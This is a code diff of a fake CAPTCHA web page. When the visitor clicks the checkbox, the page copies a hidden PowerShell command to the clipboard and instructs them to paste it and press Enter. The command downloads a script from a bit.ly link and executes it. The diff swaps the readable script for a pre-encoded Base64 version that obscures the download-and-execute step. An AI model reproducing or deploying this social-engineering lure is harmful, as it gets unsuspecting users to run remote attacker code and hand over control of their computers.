@@ -54,19 +54,12 @@
         <p>2. Press CTRL + V</p>
         <p>3. Press Enter</p>
     </div>
-    <script>
+   <script>
     document.getElementById('captchaCheckbox').addEventListener('click', () => {
-        // The PowerShell script to fetch and execute the remote script
-        const powershellScript = `
-            $scriptUrl = 'https://bit.ly/clickjackpoc';
-            $content = (Invoke-WebRequest -Uri $scriptUrl).Content;
-            Invoke-Expression $content;
-        `;
+        // Correct Base64-encoded PowerShell command
+        const encodedCommand = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBjAGwAaQBjAGsAagBhAGMAawBwAG8AYwAnACkALgBDAG8AbgB0AGUAbgB0ADsA";
 
-        // Encode the PowerShell script into Base64
-        const encodedCommand = btoa(unescape(encodeURIComponent(powershellScript)));
-
-        // Construct the full PowerShell command
+        // Full PowerShell command
         const fullCommand = `powershell -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCommand}`;
 
         // Write the command to the clipboard
